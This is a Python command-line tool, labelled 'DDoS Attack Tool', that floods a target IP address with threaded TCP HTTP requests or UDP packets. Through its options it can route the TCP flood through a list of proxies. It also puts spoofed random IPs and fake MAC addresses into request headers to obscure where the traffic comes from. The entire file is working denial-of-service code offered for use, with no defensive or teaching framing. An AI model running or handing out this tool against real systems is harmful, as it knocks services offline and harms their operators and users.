import argparse
import socket
import threading
import random
import time
import os
from rich.console import Console
from rich.text import Text
from colorama import Fore, Style

class DDoSAttack:
    def __init__(self, target_ip, target_port=80, threads_count=1000, attack_type='TCP', proxies=None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads_count = threads_count
        self.attack_type = attack_type
        self.proxies = proxies if proxies else []
        self.console = Console()
        self.running = True
        self.threads = []  

    def get_random_ip(self):
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def get_random_mac(self):
        return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

    def attack(self):
        while self.running:
            try:
                if self.attack_type.upper() == 'TCP':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.proxies:
                        proxy = random.choice(self.proxies)
                        try:
                            s.connect((proxy[0], proxy[1]))
                            s.sendto(f"CONNECT {self.target_ip}:{self.target_port} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n".encode(), (proxy[0], proxy[1]))
                        except Exception as e:
                            print(f"{Fore.RED}[!] Proxy error: {e}{Style.RESET_ALL}")
                            s.close()
                            continue
                    else:
                        s.connect((self.target_ip, self.target_port))
                elif self.attack_type.upper() == 'UDP':
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                random_ip = self.get_random_ip()
                random_mac = self.get_random_mac()

                if self.attack_type.upper() == 'TCP':
                    request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random_ip}\r\nX-Forwarded-For: {random_ip}\r\nX-Client-IP: {random_ip}\r\nX-MAC: {random_mac}\r\n\r\n"
                    s.sendto(request.encode('ascii'), (self.target_ip, self.target_port))
                else:
                    s.sendto(b'\x00' * 1024, (self.target_ip, self.target_port))

                print(f"{Fore.BLUE}[*] Attack from {random_ip} (MAC: {random_mac}) to {self.target_ip}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
            finally:
                s.close()

    def run(self):
        console = Console()
        console.print(Text("""                     
                             ____  ____       ____  
                            |  _ \|  _ \  ___/ ___| 
                            | | | | | | |/ _ \___ \ 
                            | |_| | |_| | (_) |__) |
                            |____/|____/ \___/____/ 
                           --------------------------
                         Developed by: Ibrahem abo kila                       
                    """, style="bold magenta"))
        try:
            for _ in range(self.threads_count):
                thread = threading.Thread(target=self.attack)
                self.threads.append(thread)
                thread.start()

            start_time = time.time()
            duration = 60  

            while self.running:
                elapsed_time = time.time() - start_time
                if elapsed_time > duration:
                    print(f"{Fore.GREEN}[*] Attack completed.{Style.RESET_ALL}")
                    self.stop_attack()
                    break

        except KeyboardInterrupt:
            print(f"{Fore.BLUE}\n[*] Stopping the attack...{Style.RESET_ALL}")
            self.stop_attack()

    def stop_attack(self):
        self.running = False
        for thread in self.threads:
            thread.join()
        print(f"{Fore.GREEN}[*] All threads stopped. Exiting...{Style.RESET_ALL}")
        os._exit(0)

    @staticmethod
    def load_proxies(file_path):
        proxies = []
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    if line.strip():
                        proxy_ip, proxy_port = line.strip().split(':')
                        proxies.append((proxy_ip, int(proxy_port)))
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading proxies: {e}{Style.RESET_ALL}")
        return proxies

def main():
    parser = argparse.ArgumentParser(description="DDoS Attack Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p","--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t","--threads", type=int, default=1000, help="Number of threads (default: 1000)")
    parser.add_argument("-a","--attack", choices=['TCP', 'UDP'], default='TCP', help="Type of attack (default: TCP)")
    parser.add_argument("-P","--proxies", type=str, help="Path to the proxies file")
    
    args = parser.parse_args()

    proxies = DDoSAttack.load_proxies(args.proxies) if args.proxies else None
    ddos_checker = DDoSAttack(target_ip=args.target, target_port=args.port, threads_count=args.threads, attack_type=args.attack, proxies=proxies)
    ddos_checker.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.BLUE}[*] Exiting...{Style.RESET_ALL}")
        os._exit(0)
